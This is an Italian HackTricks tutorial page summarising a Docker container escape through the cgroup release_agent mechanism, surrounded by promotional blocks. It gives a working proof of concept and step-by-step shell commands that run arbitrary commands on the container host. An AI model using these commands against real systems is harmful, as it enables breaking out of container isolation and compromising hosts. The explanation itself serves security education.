# Fuga di privilegi Docker release\_agent cgroups

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark web** che offre funzionalità **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale è combattere i sequestri di account e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:

{% embed url="https://whiteintel.io" %}

---

**Per ulteriori dettagli, consulta il [post originale del blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Questo è solo un riassunto:

PoC originale:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
La prova di concetto (PoC) dimostra un metodo per sfruttare i cgroups creando un file `release_agent` e attivandone l'invocazione per eseguire comandi arbitrari sull'host del contenitore. Ecco una panoramica dei passaggi coinvolti:

1. **Preparare l'Ambiente:**
- Viene creato un directory `/tmp/cgrp` per fungere da punto di mount per il cgroup.
- Il controller cgroup RDMA viene montato su questa directory. In caso di assenza del controller RDMA, si consiglia di utilizzare il controller cgroup `memory` come alternativa.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Impostare il Cgroup Figlio:**
   - Viene creato un cgroup figlio chiamato "x" all'interno della directory cgroup montata.
   - Le notifiche vengono abilitate per il cgroup "x" scrivendo 1 nel suo file notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configurare l'Agente di Rilascio:**
   - Il percorso del container sull'host viene ottenuto dal file /etc/mtab.
   - Il file release_agent del cgroup viene quindi configurato per eseguire uno script di nome /cmd situato nel percorso dell'host acquisito.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Creare e Configurare lo Script /cmd:**
- Lo script /cmd viene creato all'interno del container e viene configurato per eseguire ps aux, reindirizzando l'output in un file chiamato /output nel container. Viene specificato il percorso completo di /output sull'host.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Innesca l'Attacco:**
- Viene avviato un processo all'interno del cgroup figlio "x" e viene immediatamente terminato.
- Questo attiva il `release_agent` (lo script /cmd), che esegue ps aux sull'host e scrive l'output su /output all'interno del container.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark web** che offre funzionalità **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale è combattere i takeover di account e gli attacchi di ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>
